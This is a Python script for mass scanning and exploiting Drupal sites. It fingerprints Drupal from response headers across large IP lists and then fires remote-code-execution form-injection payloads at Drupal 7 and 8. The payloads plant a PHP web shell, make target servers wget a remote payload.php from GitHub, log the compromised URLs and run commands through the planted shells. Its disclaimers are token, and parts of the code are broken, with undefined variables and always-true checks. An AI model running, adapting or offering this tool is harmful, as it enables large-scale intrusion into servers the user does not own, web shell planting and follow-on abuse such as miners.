#Drupal Mass Discovery / sheller / Verifier
#thanks to firefart , g0tmi1k and various others
#DO not use this for wrong .
#do not use this to distribute miners just dont do it
#I couldn't really verify too much of the shell portion in the wild You guys will have to have permission to use this on targets
# I have found allot of shells on a honey pot I had payload.php,s.php,upload.php,sr57.php,sr57blackbird.php,cvecheck.php
#among many others I also Have found some Shells put onto my instance with a miner and such and code to stop other miners.
#what I didnt see is autorooting and dropping of rootkits
#people are definately slacking which is good either that or You people patched and  discouraged these idiots
#either way be gentle on the tested hosts please do not use this todo anything wrong to a vuln Host
import httplib
import urllib2
import time
import os
import string
from random import *
import requests
import subprocess
import threading
import Queue as queue
import uuid
import base64
import re
drupal_list = []
succesful_shells = []
q = queue.Queue()
xploitq = queue.Queue()
seven_shell_hunter = []
headers = {'User-Agent': 'Mozilla 5.0'}
evil = '<?php system($_GET["id"]); ?>'
base = base64.b64encode(evil)
base_decode = base64.b64decode(base)
evil2 = "echo " + base + " | base64 -d | tee thisisacvetestdeleteme.php"
phpmethod = 'exec'


#firefarts code
def sevenup(HOST):
   get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':'id', 'name[#type]':'markup'}
   post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
   r = requests.post(HOST, data=post_params, params=get_params)
   m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
   if m:
      found = m.group(1)
      get_params = {'q':'file/ajax/name/#value/' + found}
      post_params = {'form_build_id':found}
      r = requests.post(HOST, data=post_params, params=get_params,timeout=3,verify=False,headers=headers)
      print(r.text)
      return r.text

#pretty sure this belongs to g0tm1lk and another I ported this from ruby
def tester(target):
   try:
      url = target + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
      payload = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=" + phpmethod + "&mail[a][#type]=markup&mail[a][#markup]=" + evil2
      r = requests.post(url,data=payload, verify=False, timeout=3)
      if r.status_code != 200:  
         pass
      if r.status_code == 200:
	     #one would need to use commander(target,command,shell_name) verify the data and add to shell list etc
         succesful_shells.append(target)
   except:
      pass

#have to check  where this came from   
def run(u):
    try:
        payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'wget https://raw.githubusercontent.com/dr-iman/SpiderProject/master/lib/exploits/web-app/wordpress/ads-manager/payload.php'}
        url = u + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' 
        r = requests.post(url, data=payload, verify=False, headers=headers)
        if 'Select Your File :' in requests.get(u+'/payload.php', verify=False, headers=headers).text:
            print ('\n\aUploaded:', u + '/payload.php\n')
            with open('drupals_shells.txt', mode='a') as d:
                d.write(u + '/payload.php\n')
        else:
            print(u, " -> Not exploitable")
    except:
        pass

     
def parse_headers(url):
    try:
       r = requests.head(url,allow_redirects=False, timeout=3,verify=False)
    
       version = ""
       cache = ""
       #if 'X-Drupal-Cache' or 'X-Generator' in r.headers: drupal version detection via X-Generator 
       #print r.headers
       if "Drupal"  in r.headers['X-Generator']:
          print r.headers
          print url + """   """+ "Drupal Version Detected:" + r.headers['X-Generator'] +"\n"
          version = r.headers['X-Generator']
          server_soft = r.headers['Server']
          drupal_list.append(url)
          f2.write(str(data))
          f2.write("\n")
          if "7" in version:
             seven_shell_hunter.append(url)
      
       else:
           if "HIT" or "MISS" in r.headers["X-Drupal-Cache"]:
              print url + """   """+ "Drupal Caching Detected:" + r.headers["X-Drupal-Cache"] +"\n"
              cache = r.headers["X-Drupal-Cache"]
              server_soft = r.headers['Server']
              drupal_list.append(url)
              f2.write(str(data))
              f2.write("\n")

  
        
    except:
       pass



    
def worker():
    while True:
        ip = q.get()
        parse_headers(ip)
        q.task_done()

    
def xploit_worker():
    while True:
        ip = xploitq.get()
        try:
           run(ip)
           tester(ip)
        except:
            pass
        xploitq.task_done()


def commander(target,command,shell_name):
    system_cmd_url = target + "/"+shell_name+"?c="+command
    r = requests.get(system_cmd_url, verify=False, timeout=3,headers=headers)
    if r.status_code != 200:  
         pass
    if r.status_code == 200:
       return r.content

        
def main():
  
    try:
         #this would contain the filepath to split filedata from 50gb plus scan
         file_path = sys.argv[1]
         files_to_scan = os.listdir(file_path)
         for files in files_to_scan:
             file_work = file_path+files
             with open(file_work, 'r') as f:
                print " Opening File:"+file_work +"\n"
                for line in map(lambda line: line.rstrip('\n'), f):
                    ip = line.strip()
                    if "http" in ip:
                      if ip: q.put(ip)
                    else:
                       ip = line.strip()
                       newip = "http://"+ip
                       if ip: q.put(newip)
                f.close()
             for i in range(40):
                 t = threading.Thread(target=worker)
                 t.daemon = True
                 t.start()
   
             q.join()
         
    except KeyboardInterrupt:
           print('[INFO]: You pressed Ctrl+C, exit.')
           exit()

    
    
    for items in drupal_list:
        url = items.rstrip()
        xploitq.put(url)
       
    for i in range(20):
        t = threading.Thread(target=xploit_worker)
        t.daemon = True
        t.start()
   
    xploitq.join()
                    
    shell_wond3r()

def shell_wond3r():
    for shells in succesful_shells:
        print shells +"\n"

    for shells in seven_shell_hunter:
        try:
            answer = sevenup(HOST)
            if "uid" or "gid" in answer:
               succesful_shells.append(url)
               print "shellable version 7 Drupal"
            else:
                pass
        except:
             pass
    
if __name__ == '__main__':
   main()

